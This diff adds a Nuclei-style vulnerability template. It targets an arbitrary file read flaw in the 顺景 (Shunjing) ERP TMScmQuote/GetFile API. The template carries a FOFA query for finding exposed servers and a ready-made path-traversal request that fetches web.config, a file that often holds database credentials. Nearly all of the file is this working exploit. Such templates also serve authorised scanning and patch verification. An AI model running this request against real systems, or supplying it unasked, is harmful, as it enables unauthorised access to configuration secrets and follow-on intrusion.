@@ -1,0 +1,31 @@
+id: poc-hx6shtigiacymrwu
+info:
+  name: 顺景ERP TMScmQuoteGetFile 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hx6shtigiacymrwu'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hx6shtigiacymrwu
+    fofa: body="顺景软件 WebAPI 服务端"
+http:
+- raw:
+  - 'GET /api/TMScmQuote/GetFile?FullGuidFileName=/../web.config&FileName= HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
